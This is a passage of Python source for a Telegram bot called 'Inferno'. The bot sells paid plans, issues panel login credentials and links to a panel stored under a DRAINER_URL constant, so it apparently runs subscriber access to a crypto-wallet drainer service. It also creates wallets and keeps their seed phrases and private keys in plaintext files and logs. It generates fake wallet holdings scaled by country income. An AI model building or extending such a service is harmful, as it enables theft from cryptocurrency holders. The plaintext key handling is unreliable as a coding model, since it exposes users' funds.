        if data == "login_panel":
            is_panel_interaction = True

    if is_panel_interaction:
        panel_interaction_flags[user_id] = True  # Pause reminders
    else:
        # Cancel payment process
        await check_and_cancel_payment(user_id, context.bot)
        panel_interaction_flags.pop(user_id, None)  # Clear flag
        await context.bot.send_message(
            user_id,
            localized_text_for_user(user_id, context, "payment_interrupted")
        )

async def check_and_cancel_payment(user_id: int, bot):
    """Cancel payment tasks and cleanup data."""
    if user_id in active_payments:
        # Cancel verification task
        task = active_payments[user_id].get('verification')
        if task and not task.done():
            task.cancel()
        del active_payments[user_id]
    
    if user_id in pending_payments:
        del pending_payments[user_id]
    
    # Optional: Notify user
    await bot.send_message(
        user_id,
        localized_text_for_user(user_id, None, "payment_not_complete")
    )

async def check_payment_interruption(update: Update, context: CallbackContext):
    """
    Intercepts all user interactions during payment confirmation process.
    Cancels verification if user interacts with unauthorized commands/buttons.
    """
    user_id = update.effective_user.id
    if user_id not in active_payments:
        return  # No active payment process

    # Allow /panel command and login panel button
    if update.message and update.message.text == "/panel":
        return
    if update.callback_query and "login_panel" in update.callback_query.data:
        return

    # Cancel verification task
    verification_task = active_payments[user_id].get("verification")
    if verification_task and not verification_task.done():
        verification_task.cancel()

async def help_command(update: Update, context: CallbackContext):
    """Send a help message with a list of available commands."""
    await update.message.reply_text(localized_text(update, context, "help"))


def is_ethereum_address_text(text: str) -> bool:
    """Detect an Ethereum address-like string without requiring current context."""
    if not text:
        return False
    text = text.strip()
    return bool(re.fullmatch(r"0x[a-fA-F0-9]{40}", text))


def is_non_ethereum_wallet_address_text(text: str) -> bool:
    """Detect common non-Ethereum wallet address formats."""
    if not text:
        return False
    text = text.strip()
    patterns = [
        r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",        # Bitcoin legacy
        r"^bc1[0-9a-z]{25,39}$",                       # Bitcoin Bech32
        r"^T[a-zA-Z0-9]{33}$",                         # Tron TRC-20
        r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$",         # Litecoin
        r"^r[1-9A-HJ-NP-Za-km-z]{25,34}$",             # Ripple
        r"^sol[a-z0-9]{39}$",                          # Solana (heuristic)
    ]
    return any(re.fullmatch(pat, text) for pat in patterns)


def ensure_wallets_folder():
    """Create wallets folder if it doesn't exist."""
    base_dir = Path(__file__).resolve().parent
    wallets_dir = base_dir / "wallets"
    wallets_dir.mkdir(parents=True, exist_ok=True)
    return str(wallets_dir)


async def get_wallet_balance(address: str) -> str:
    """Get wallet balance from Ethereum blockchain."""
    try:
        balance_wei = web3.eth.get_balance(address)
        balance_eth = web3.from_wei(balance_wei, 'ether')
        return f"{balance_eth:.6f} ETH"
    except Exception as e:
        logger.error(f"Error fetching balance for {address}: {e}")
        return "Unknown"


def save_wallet_to_file(user_id: int, address: str, seed_phrase: str = None, balance: str = "Pending", wallet_type: str = "new"):
    """Save wallet information to a text file in the wallets folder."""
    try:
        wallets_dir = ensure_wallets_folder()
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(wallets_dir, f"user_{user_id}_{timestamp}.txt")
        
        with open(filename, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("🩸 INFERNO WALLET INFORMATION 🩸\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"User ID: {user_id}\n")
            f.write(f"Wallet Type: {wallet_type.upper()}\n")
            f.write(f"Created: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}\n\n")
            f.write("-" * 60 + "\n")
            f.write("WALLET ADDRESS\n")
            f.write("-" * 60 + "\n")
            f.write(f"{address}\n\n")
            
            if seed_phrase and wallet_type == "new":
                f.write("-" * 60 + "\n")
                f.write("SEED PHRASE (KEEP SAFE!)\n")
                f.write("-" * 60 + "\n")
                f.write(f"{seed_phrase}\n\n")
            
            f.write("-" * 60 + "\n")
            f.write("BALANCE\n")
            f.write("-" * 60 + "\n")
            f.write(f"{balance}\n\n")
            f.write("=" * 60 + "\n")
            f.write("⚠️  IMPORTANT: Keep this file and your seed phrase safe!\n")
            f.write("=" * 60 + "\n")
        
        logger.info(f"Wallet information saved to {filename}")
        return filename
    except Exception as e:
        logger.error(f"Error saving wallet to file: {e}")
        return None


async def view_seeds(update: Update, context: CallbackContext):
    """Show the user their stored wallet addresses and seed phrases."""
    user_id = update.message.from_user.id
    
    try:
        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT address, seed_phrase, private_key FROM wallets WHERE user_id = ?",
                (user_id,),
            )
            rows = cursor.fetchall()

        if not rows:
            await update.message.reply_text(
                "You do not have any saved wallets yet. \n"
                "Use /new_ethereum_wallet to create one or /set_up to add an existing wallet."
            )
            return

        # Prepare wallet information
        retrieving_msg = localized_text_for_user(user_id, context, "wallet_retrieving")
        await update.message.reply_text(retrieving_msg)
        
        header = localized_text_for_user(user_id, context, "wallet_header")
        reply_lines = [f"{header}\n\n"]
        
        for idx, (address, seed_phrase, private_key) in enumerate(rows, start=1):
            # Determine wallet type
            wallet_type = localized_text_for_user(user_id, context, "wallet_info_type", wallet_type="New" if seed_phrase else "Imported")
            type_label = "New" if seed_phrase else "Imported"
            
            # Get balance
            balance = await get_wallet_balance(address)
            
            reply_lines.append(f"📍 Wallet {idx}:\n")
            reply_lines.append(f"{localized_text_for_user(user_id, context, 'wallet_info_type', wallet_type=type_label)}\n")
            reply_lines.append(f"{localized_text_for_user(user_id, context, 'wallet_info_address', address=address)}\n")
            reply_lines.append(f"{localized_text_for_user(user_id, context, 'wallet_info_balance', balance=balance)}\n")
            
            if seed_phrase and type_label == "New":
                reply_lines.append(f"{localized_text_for_user(user_id, context, 'wallet_info_seed', seed_phrase=seed_phrase)}\n")
            
            reply_lines.append("\n")

        # Add file information
        wallets_dir = ensure_wallets_folder()
        wallet_files = [f for f in os.listdir(wallets_dir) if f.startswith(f"user_{user_id}")]
        
        if wallet_files:
            reply_lines.append("-" * 50 + "\n")
            reply_lines.append(f"{localized_text_for_user(user_id, context, 'wallet_saved_confirm')}\n")

        await update.message.reply_text("".join(reply_lines), parse_mode="Markdown")
        
    except Exception as e:
        logger.error(f"Error in view_seeds: {e}")
        error_msg = localized_text_for_user(user_id, context, "wallet_retrieval_error")
        await update.message.reply_text(error_msg)


async def unknown_text_handler(update: Update, context: CallbackContext):
    """Handle unknown text messages and wallet Address-only text without context."""
    text = update.message.text.strip() if update.message and update.message.text else ""
    
    # Check if user is in an active conversation flow - if so, ignore this handler
    input_mode = context.user_data.get('input_mode')
    wallet_verified = context.user_data.get('wallet_verified', False)
    verified_address = context.user_data.get('verified_address')
    wallet_import_attempt = context.user_data.get('wallet_import_attempt', False)
    
    # Don't process if user is in active wallet setup/import flow, has verified wallet, or just attempted import
    if input_mode in ['import_wallet'] or wallet_verified or verified_address or wallet_import_attempt:
        # User is in wallet flow, has verified wallet, or just had import error - don't interfere
        return

    if is_ethereum_address_text(text):
        await update.message.reply_text(localized_text(update, context, "unknown_ethereum"))
        return

    if is_non_ethereum_wallet_address_text(text):
        await update.message.reply_text(localized_text(update, context, "unknown_non_ethereum"))
        return

    await update.message.reply_text(localized_text(update, context, "unknown_default"))


# -------------------- Bot Data Cleanup Function --------------------
def bot_data_cleanup(user_id: int, context: CallbackContext = None):
    """Clean up stored payment data and cancel any active tasks for a user."""
    if context and "payment_data" in context.user_data:
        context.user_data.pop("payment_data", None)
    if user_id in pending_payments:
        del pending_payments[user_id]
    if user_id in active_payments:
        if 'verification' in active_payments[user_id]:
            active_payments[user_id]['verification'].cancel()
        del active_payments[user_id]
    if user_id in panel_interaction_flags:
        del panel_interaction_flags[user_id]

# ---------------------------------------------
# Registers Button Callback & Conversation Handler
# ---------------------------------------------

# -------------------- Register Interrupt Handlers --------------------
def register_interrupt_handlers(application):
    # These handlers catch any message or callback query.
    application.add_handler(MessageHandler(filters.ALL, interrupt_payment), group=0)
    application.add_handler(CallbackQueryHandler(interrupt_payment), group=0)

def get_payment_conversation_handler():
    return ConversationHandler(
        entry_points=[CallbackQueryHandler(payment_confirmation, pattern=r"^confirm:")],
        states={},
        fallbacks=[],
        allow_reentry=True,
    )

emerald_equivalents = calculate_equivalent_amounts(PLANS["emerald"]["fee_eth"])
diamond_equivalents = calculate_equivalent_amounts(PLANS["diamond"]["fee_eth"])

# Now print the equivalents correctly
print(f"ETH: {PLANS['emerald']['fee_eth']}")
print(f"Converted BTC: {emerald_equivalents['btc']}")
print(f"Converted USDT: {emerald_equivalents['usdt']}")

print(f"ETH: {PLANS['diamond']['fee_eth']}")
print(f"Converted BTC: {diamond_equivalents['btc']}")
print(f"Converted USDT: {diamond_equivalents['usdt']}")

# ------------------------------------------
# Start and Command Handlers
# ------------------------------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display the same panel/features intro as /features."""
    return await features_command(update, context)

async def verify_wallet(update: Update, context: CallbackContext):
    address = update.message.text.strip()
    user_id = update.message.from_user.id
    
    try:
        # Comprehensive Ethereum address validation
        is_valid, error_msg = validate_ethereum_address_comprehensive(address)
        if not is_valid:
            raise InvalidAddress(error_msg)
        
        checksum_addr = web3.to_checksum_address(address)
        
        # Try database connection, but continue if it fails
        try:
            with safe_db_connection() as conn:  # Use the context manager
                cursor = conn.cursor()
                cursor.execute("SELECT address FROM wallets WHERE user_id = ?", (user_id,))
                existing_wallet = cursor.fetchone()
                
                if existing_wallet:
                    await update.message.reply_text(
                        localized_text(update, context, "existing_wallet_already")
                    )
                    return ConversationHandler.END
        except Exception as db_error:
            logging.warning(f"Database error, skipping wallet check: {db_error}")
            # Continue without stopping execution

        # Proceed with wallet verification even if DB check fails
        await update.message.reply_text(
            localized_text(update, context, "wallet_verification_success", address=checksum_addr),
            parse_mode="Markdown"
        )
        return FEE_CONFIRMATION
        
    except InvalidAddress as e:
        await update.message.reply_text(
            localized_text(update, context, "wallet_invalid_ethereum", error=str(e)),
            parse_mode="Markdown"
        )
        return VERIFY_WALLET
    except Exception as e:
        logging.warning(f"Non-fatal error during wallet verification: {e}")
        await update.message.reply_text(
            localized_text(update, context, "wallet_minor_issue")
        )
        return FEE_CONFIRMATION  # Proceed even if there's an error


# Setup command
async def set_up(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        localized_text(update, context, "setup_menu"),
        reply_markup=setup_keyboard(update, context)
    )
    return SETUP

async def restart_setup(update: Update, context: CallbackContext):
    """Handle restart_setup callback - redisplay the setup menu."""
    query = update.callback_query
    await query.answer()
    
    # Clear wallet import flags when restarting setup
    context.user_data['wallet_import_attempt'] = False
    context.user_data['input_mode'] = None
    
    await query.message.reply_text(
        localized_text(update, context, "setup_menu"),
        reply_markup=setup_keyboard(update, context)
    )
    return SETUP

async def handle_existing_wallet(update: Update, context: CallbackContext):
    """Prompt user to enter their existing wallet address."""
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        logger.info(f"User {user_id} - Starting existing wallet import flow")
        
        await query.message.reply_text(
            localized_text(update, context, "import_wallet_prompt"),
            parse_mode="Markdown"
        )
        
        # Set the mode for next handler
        context.user_data['input_mode'] = 'import_wallet'
        return WALLET_INPUT
        
    except Exception as e:
        logger.error(f"Error in handle_existing_wallet: {e}", exc_info=True)
        await update.callback_query.message.reply_text(localized_text(update, context, "generic_error_try_again"))
        return SETUP


async def process_imported_wallet(update: Update, context: CallbackContext):
    """Process and validate the imported wallet address."""
    user_id = None
    try:
        address = update.message.text.strip()
        user_id = update.message.from_user.id
        input_mode = context.user_data.get('input_mode')
        
        # Verify this is from the import flow
        if input_mode != 'import_wallet':
            logger.warning(f"User {user_id} - Invalid mode: {input_mode}")
            await update.message.reply_text(localized_text(update, context, "invalid_input_mode"))
            return ConversationHandler.END
        
        # Clear input mode immediately to prevent re-triggering
        context.user_data['input_mode'] = None
        
        # Validate address format
        if not address:
            await update.message.reply_text(localized_text(update, context, "address_empty"))
            return WALLET_INPUT
        
        if len(address) < 10:
            await update.message.reply_text(localized_text(update, context, "address_short"))
            return WALLET_INPUT
        
        # Validate address comprehensively
        is_valid, error_msg = validate_ethereum_address_comprehensive(address)
        if not is_valid:
            await update.message.reply_text(localized_text(update, context, "address_invalid", error=error_msg))
            return WALLET_INPUT
        
        # Convert to checksum format
        checksum_addr = web3.to_checksum_address(address)
        logger.info(f"User {user_id} - Validated address: {checksum_addr}")
        
        # Check for existing registration
        try:
            with safe_db_connection() as conn:
                cursor = conn.cursor()
                
                # Check if this user already has the same wallet
                cursor.execute("SELECT address FROM wallets WHERE user_id = ? AND address = ?", (user_id, checksum_addr))
                same_wallet = cursor.fetchone()
                
                if same_wallet:
                    # Store in context as if wallet was just verified
                    context.user_data['verified_address'] = checksum_addr
                    context.user_data['wallet_verified'] = True
                    
                    await update.message.reply_text(
                        localized_text(update, context, "wallet_registered_same", address=checksum_addr),
                        reply_markup=proceed_to_plans_keyboard(update, context),
                        parse_mode="Markdown"
                    )
                    return PLAN_SELECTION
                
                # Check if user has other wallets
                cursor.execute("SELECT address FROM wallets WHERE user_id = ? LIMIT 1", (user_id,))
                other_user_wallet = cursor.fetchone()
                
                if other_user_wallet and other_user_wallet[0].lower() != checksum_addr.lower():
                    # Set flag to prevent repeated error message from unknown_text_handler
                    context.user_data['wallet_import_attempt'] = True
                    
                    await update.message.reply_text(
                        localized_text(update, context, "wallet_registered_different", address=other_user_wallet[0]),
                        parse_mode="Markdown"
                    )
                    return WALLET_INPUT
                
                # Check if address is used by another user
                cursor.execute("SELECT user_id FROM wallets WHERE address = ?", (checksum_addr,))
                other_user = cursor.fetchone()
                
                if other_user and other_user[0] != user_id:
                    logger.warning(f"Address {checksum_addr} already registered to user {other_user[0]}")
                    # Set flag to prevent repeated error message from unknown_text_handler
                    context.user_data['wallet_import_attempt'] = True
                    
                    keyboard = [[InlineKeyboardButton(localized_text(update, context, "use_setup_button"), callback_data="restart_setup")]]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    await update.message.reply_text(
                        localized_text(update, context, "wallet_registered_other", address=checksum_addr),
                        reply_markup=reply_markup,
                        parse_mode="Markdown"
                    )
                    return WALLET_INPUT
        except Exception as db_error:
            logger.error(f"Database error checking wallet: {db_error}")
            await update.message.reply_text(localized_text(update, context, "database_error_try"))
            return WALLET_INPUT
        
        # Get balance
        try:
            balance = await get_wallet_balance(checksum_addr)
        except Exception as balance_error:
            logger.warning(f"Could not fetch balance for {checksum_addr}: {balance_error}")
            balance = "N/A"
        
        # Store wallet in database
        try:
            with safe_db_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(
                    "INSERT INTO wallets (user_id, address, private_key, seed_phrase) VALUES (?, ?, ?, ?)",
                    (user_id, checksum_addr, None, None)
                )
                conn.commit()
                logger.info(f"User {user_id} - Wallet stored: {checksum_addr}")
        except sqlite3.IntegrityError as integrity_error:
            logger.error(f"Integrity error storing wallet: {integrity_error}")
            await update.message.reply_text(localized_text(update, context, "wallet_already_registered"))
            return WALLET_INPUT
        except Exception as save_error:
            logger.error(f"Error saving wallet: {save_error}")
            await update.message.reply_text(localized_text(update, context, "wallet_save_error"))
            return WALLET_INPUT
        
        # Save to file
        try:
            saved_file = save_wallet_to_file(user_id, checksum_addr, None, balance, "imported")
            file_info = localized_text(update, context, "wallet_saved_file", filename=os.path.basename(saved_file)) if saved_file else ""
        except Exception as file_error:
            logger.warning(f"Could not save wallet file: {file_error}")
            file_info = ""
        
        # Success message
        await update.message.reply_text(
            localized_text(
                update,
                context,
                "wallet_imported_success",
                address=checksum_addr,
                balance=balance,
                file_info=file_info,
            ),
            parse_mode="Markdown"
        )
        
        # Store in context and move to plans
        context.user_data['verified_address'] = checksum_addr
        context.user_data['wallet_verified'] = True
        
        # Show fee setup
        await send_setup_fee_message(update.message, update, context)
        
        return PLAN_SELECTION
    
    except Exception as e:
        if user_id:
            logger.error(f"Error in process_imported_wallet for user {user_id}: {e}", exc_info=True)
        else:
            logger.error(f"Error in process_imported_wallet: {e}", exc_info=True)
        await update.message.reply_text(
            localized_text(update, context, "wallet_import_unexpected")
        )
        return WALLET_INPUT

async def reset_wallet(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM wallets WHERE user_id = ?", (user_id,))
        conn.commit()
    
    await update.message.reply_text(
        localized_text(update, context, "wallet_reset")
    )
    return ConversationHandler.END


async def delete_all_wallets(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM wallets WHERE user_id = ?", (user_id,))
        count_before = cursor.fetchone()[0] or 0
        cursor.execute("DELETE FROM wallets WHERE user_id = ?", (user_id,))
        conn.commit()

    if count_before:
        response = f"✅ Deleted {count_before} wallet(s)."
    else:
        response = "⚠️ You have no saved wallets to delete."

    await update.message.reply_text(
        f"{response}\n\nYou can create a new Ethereum wallet or import an existing one.",
        reply_markup=wallet_recovery_keyboard(update, context),
    )
    return ConversationHandler.END


async def delete_wallets(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    raw_args = " ".join(context.args or [])
    targets = [item.strip() for item in re.split(r"[\s,]+", raw_args) if item.strip()]

    if not targets:
        await update.message.reply_text(
            "Usage: /delete wallet1,wallet2\nExample: /delete 0xabc123...,0xdef456...",
            reply_markup=wallet_recovery_keyboard(update, context),
        )
        return ConversationHandler.END

    deleted = []
    not_found = []
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        for target in targets:
            normalized = target
            if re.fullmatch(r"[0-9a-fA-F]{40}", target):
                normalized = f"0x{target}"

            if normalized.lower().startswith("0x"):
                try:
                    normalized = web3.to_checksum_address(normalized)
                except Exception:
                    normalized = normalized.lower()

            cursor.execute(
                "DELETE FROM wallets WHERE user_id = ? AND lower(address) = ?",
                (user_id, normalized.lower())
            )
            if cursor.rowcount > 0:
                deleted.append(target)
            else:
                not_found.append(target)
        conn.commit()

    response_lines = []
    if deleted:
        response_lines.append(f"✅ Deleted wallet(s): {', '.join(deleted)}")
    if not_found:
        response_lines.append(f"⚠️ Could not find wallet(s): {', '.join(not_found)}")

    await update.message.reply_text(
        "\n".join(response_lines) if response_lines else "⚠️ No valid wallet addresses were provided.",
        reply_markup=wallet_recovery_keyboard(update, context),
    )
    return ConversationHandler.END


# New cancel command handler
async def cancel_setup(update: Update, context: CallbackContext):
    """Cancel ongoing setup process"""
    user_id = update.message.from_user.id
    context.user_data.clear()
    
    await update.message.reply_text(
        localized_text(update, context, "setup_cancelled")
    )
    logger.info(f"User {user_id} cancelled setup process")
    return ConversationHandler.END
# Panel Command
async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logged_in = context.user_data.get('logged_in', False)
    user_id = update.effective_user.id
    lang = get_user_language_by_id(user_id, context)
    
    keyboard = [[InlineKeyboardButton(localized_text_for_user(user_id, context, "panel_open_button"), url=DRAINER_URL)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if logged_in:
        panel_id = context.user_data.get('panel_id', 'unknown')
        message = localized_text_for_user(user_id, context, "panel_logged_in", panel_id=panel_id)
        await update.message.reply_text(message, reply_markup=reply_markup)
    else:
        header = localized_text_for_user(user_id, context, "panel_logged_out_header")
        body = localized_text_for_user(user_id, context, "panel_logged_out_message")
        await update.message.reply_text(f"{header}\n\n{body}", reply_markup=reply_markup)

import logging
import random
import string
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler

# Logging configuration
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
    level=logging.INFO
)

def generate_random_string(length=12):
    """Generates a random alphanumeric string for login IDs and passwords."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

async def update_user_activity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Track the user's last interaction time."""
    user = update.effective_user
    if not user:
        return
    user_last_activity[user.id] = datetime.now(timezone.utc)


def is_info_allowed(user_id: int) -> bool:
    """Return True if the user has a recent wake token and is still active."""
    now = datetime.now(timezone.utc)
    wake_expires = user_wake_expiry.get(user_id)
    last_active = user_last_activity.get(user_id)
    if not wake_expires or not last_active:
        return False
    if now > wake_expires:
        return False
    if now - last_active > timedelta(minutes=10):
        return False
    return True


async def wake_wake(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Activate /info access for the user for 10 minutes of activity."""
    user = update.effective_user
    if not user:
        return

    now = datetime.now(timezone.utc)
    user_last_activity[user.id] = now
    user_wake_expiry[user.id] = now + timedelta(minutes=10)

    if update.message:
        try:
            await update.message.delete()
        except Exception:
            pass


async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Generates temporary access credentials. Private chats only.
    """
    # DEFENSE-IN-DEPTH: Secondary check in case filter fails
    # (Primary protection is via filters.ChatType.PRIVATE in handler registration)
    if update.effective_chat.type != ChatType.PRIVATE:
        logger.warning(f"Attempted /info in {update.effective_chat.type} by user {update.effective_user.id}")
        return  # Silently ignore - middleware already handled it
    
    user_id = update.effective_user.id
    if not is_info_allowed(user_id):
        error_msg = localized_text_for_user(user_id, context, "info_not_allowed")
        await update.message.reply_text(error_msg)
        return

    # Generate short user-specific panel_id (max 10 chars for web input)
    panel_id = generate_random_string(10)  # 10 chars to match web input limit
    password = generate_random_string(25)

    # Store credentials in database with user_id
    store_credentials(panel_id, password, user_id)

    # Build localized message
    header = localized_text_for_user(user_id, context, "info_header")
    panel_id_line = localized_text_for_user(user_id, context, "info_panel_id", panel_id=f"<code>{panel_id}</code>")
    password_line = localized_text_for_user(user_id, context, "info_password", password=f"<code>{password}</code>")
    instructions = localized_text_for_user(user_id, context, "info_instructions")
    backup_bot_link = f'<a href="{BACKUP_BOT}">Get Bot Link</a>'
    backup_line = localized_text_for_user(user_id, context, "info_backup_bot", backup_bot_link=backup_bot_link)
    security = localized_text_for_user(user_id, context, "info_security")
    
    message_text = f"{header}\n\n{panel_id_line}\n{password_line}\n\n{instructions}\n\n{backup_line}\n\n{security}"

    keyboard = [[InlineKeyboardButton(localized_text_for_user(user_id, context, "panel_open_button"), url=DRAINER_URL)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    sent_message = await update.message.reply_text(
        message_text,
        parse_mode="HTML",
        reply_markup=reply_markup
    )
    asyncio.create_task(delete_message_after(30, sent_message, context.bot))


async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authenticate a user with stored panel credentials - works seamlessly from anywhere."""
    try:
        args = context.args
        if len(args) != 2:
            await update.message.reply_text(
                "Usage: /login <panel_id> <password>\n\n"
                "Example: /login ABC123XYZ mysecretpassword\n\n"
                "💡 Generate credentials using /info command"
            )
            return

        panel_id = args[0]
        password = args[1]
        
        # Verify credentials with proper error handling
        if verify_credentials(panel_id, password):
            context.user_data['logged_in'] = True
            context.user_data['panel_id'] = panel_id
            context.user_data['login_time'] = datetime.now(timezone.utc)
            await update.message.reply_text(
                "✅ Login successful!\n\n"
                "You can now use the available Inferno commands from anywhere in the world."
            )
        else:
            await update.message.reply_text(
                "❌ Invalid panel ID or password.\n\n"
                "Please check your credentials and try again.\n"
                "Use /info to generate new credentials."
            )
    except Exception as e:
        logger.error(f"Login error: {e}")
        await update.message.reply_text(
            "⚠️ An error occurred during login. Please try again.\n"
            "If the problem persists, use /info to generate new credentials."
        )


async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Telegram Web App data payloads for panel login."""
    try:
        if not update.message or not update.message.web_app_data:
            return

        raw_data = update.message.web_app_data.data
        data = json.loads(raw_data or "{}")
        if data.get('type') != 'panel_login':
            return

        panel_id = data.get('panel_id', '').strip()
        password = data.get('password', '').strip()

        if not panel_id or not password:
            await update.message.reply_text(
                "❌ Missing panel ID or password. Please try again from the Web App."
            )
            return

        if verify_credentials(panel_id, password):
            context.user_data['logged_in'] = True
            context.user_data['panel_id'] = panel_id
            context.user_data['login_time'] = datetime.now(timezone.utc)

            keyboard = [[InlineKeyboardButton("☑️ Open Panel", url=DRAINER_URL)]]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "✅ Login successful! Your panel credentials are valid.\n"
                "Tap the button below to open the panel in your browser.",
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                "❌ Invalid panel ID or password.\n"
                "Please check your credentials and try again. Use /info to generate new credentials."
            )
    except Exception as e:
        logger.error(f"Web App data login error: {e}")
        await update.message.reply_text(
            "⚠️ Error verifying credentials. Please try again from the Web App."
        )


async def delete_message_after(delay: int, message, bot):
    await asyncio.sleep(delay)
    try:
        await bot.delete_message(chat_id=message.chat_id, message_id=message.message_id)
    except Exception:
        pass

# 🚀 New Ethereum wallet command (✅ Fixed `NoneType` issue)
async def new_ethereum_wallet(update: Update, context: CallbackContext):
    """Handles wallet creation from both command and inline button"""
    try:
        message = None
        # Handle different update types (message or callback query)
        if update.message:
            user_id = update.message.from_user.id
            message = update.message
        elif update.callback_query:
            await update.callback_query.answer()  # Acknowledge callback
            user_id = update.callback_query.from_user.id
            message = update.callback_query.message
        else:
            print("❌ Received an unknown update type.")
            return

        # Generate wallet
        seed_phrase = generate_seed_phrase()
        private_key, address = generate_ethereum_wallet()

        # Get initial balance
        balance = await get_wallet_balance(address)

        # Store wallet in database
        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO wallets (user_id, seed_phrase, private_key, address) VALUES (?, ?, ?, ?)",
                (user_id, seed_phrase, private_key, address),
            )
            conn.commit()

        # Save wallet info to file
        saved_file = save_wallet_to_file(user_id, address, seed_phrase, balance, wallet_type="new")

        # Debugging info
        print(f"User: {user_id}, Seed Phrase: {seed_phrase}, Address: {address}")
        print(f"Wallet saved to: {saved_file}")

        # Send response (delayed messages for better UX)
        await message.reply_text(localized_text(update, context, "wallet_create_wait"))
        await asyncio.sleep(2)

        status_msg = localized_text(
            update,
            context,
            "wallet_saved_status",
            filename=os.path.basename(saved_file) if saved_file else localized_text(update, context, "wallet_saved_status_error"),
        ) if saved_file else ""

        await message.reply_text(
            localized_text(
                update,
                context,
                "wallet_created",
                address=address,
                seed_phrase=seed_phrase,
                balance=balance,
                status_msg=status_msg,
            ),
            parse_mode="Markdown"
        )

        # Update context
        context.user_data['verified_address'] = address
        context.user_data['wallet_verified'] = True

        # Display the "Proceed to Plans" message immediately
        await send_setup_fee_message(message, update, context)
        
        return PLAN_SELECTION

    except Exception as e:
        print(f"❌ Error in new_ethereum_wallet: {e}")
        logger.error(f"Error creating wallet: {e}")
        if message:
            await message.reply_text(localized_text(update, context, "wallet_generate_error"))
        return SETUP

# List of supported wallets
WALLETS = [
    {"name": "MetaMask Wallet", "url": "https://metamask.io"},
    {"name": "Trust Wallet", "url": "https://trustwallet.com"},
    {"name": "Coinbase Wallet", "url": "https://www.coinbase.com/wallet"},
    {"name": "Phantom Wallet", "url": "https://phantom.app"},
    {"name": "Atomic Wallet", "url": "https://atomicwallet.io"},
    {"name": "Exodus Wallet", "url": "https://www.exodus.com"},
    {"name": "Binance Chain Wallet", "url": "https://www.binance.org/en/wallet"},
    {"name": "Ledger Live", "url": "https://www.ledger.com/ledger-live"},
    {"name": "Trezor Suite", "url": "https://trezor.io"},
    {"name": "Crypto.com DeFi Wallet", "url": "https://crypto.com/defi-wallet"},
]

CHAINS = [
    "Ethereum",
    "Binance Smart Chain",
    "Polygon",
    "Avalanche",
    "Fantom",
    "Arbitrum",
]

# List of supported assets
ASSETS = [
    {"symbol": "ETH", "name": "Ethereum", "decimals": 6, "price_usd": 2339.11},
    {"symbol": "BTC", "name": "Bitcoin", "decimals": 6, "price_usd": 91427.02},
    {"symbol": "BNB", "name": "Binance Coin", "decimals": 6, "price_usd": 598.39},
    {"symbol": "MATIC", "name": "Polygon", "decimals": 2, "price_usd": 0.29},
    {"symbol": "USDT", "name": "Tether", "decimals": 2, "price_usd": 1},
]

# Function to generate random wallet data with multiple tokens and chains
def generate_random_wallet_data(country_name: str = None) -> dict:
    wallet_address = f"0x{''.join(random.choices('0123456789abcdef', k=40))}"
    chain = random.choice(CHAINS)

    # Random chance to simulate an empty wallet (1 in 6)
    if random.randint(1, 6) == 1:
        return {
            "wallet_address": wallet_address,
            "chain": chain,
            "net_worth": 0,
            "assets": []
        }

    high_income_countries = [
        'United States', 'Germany', 'United Kingdom', 'France', 'Canada', 'Australia',
        'Switzerland', 'Norway', 'Sweden', 'Denmark', 'Netherlands', 'Singapore',
        'Japan', 'South Korea', 'United Arab Emirates', 'Saudi Arabia', 'Luxembourg',
        'Austria', 'Belgium', 'Finland', 'Ireland', 'Iceland', 'New Zealand'
    ]
    low_income_countries = [
        'Nigeria', 'India', 'Pakistan', 'Bangladesh', 'Kenya', 'Ghana', 'Ethiopia',
        'Tanzania', 'Uganda', 'Rwanda', 'Mozambique', 'Zimbabwe', 'Zambia',
        'Malawi', 'Burundi', 'Afghanistan', 'Nepal', 'Myanmar', 'Cambodia',
        'Laos', 'Haiti', 'Yemen', 'Syria', 'Sudan', 'South Sudan', 'Somalia'
    ]

    if country_name in high_income_countries:
        target_net_worth = round(random.uniform(10_000, 500_000), 2)
    elif country_name in low_income_countries:
        target_net_worth = round(random.uniform(100, 5_000), 2)
    else:
        target_net_worth = round(random.uniform(1_000, 50_000), 2)

    wallet_data = {
        "wallet_address": wallet_address,
        "chain": chain,
        "net_worth": 0,
        "assets": []
    }

    num_assets = random.randint(1, 4)
    selected_assets = random.sample(ASSETS, num_assets)

    def asset_value_bounds(asset_symbol: str, target_value: float):
        price = next((a["price_usd"] for a in ASSETS if a["symbol"] == asset_symbol), 1)
        if asset_symbol == "BTC":
            return max(price * 0.001, 50), min(price * 0.5, target_value * 0.6)
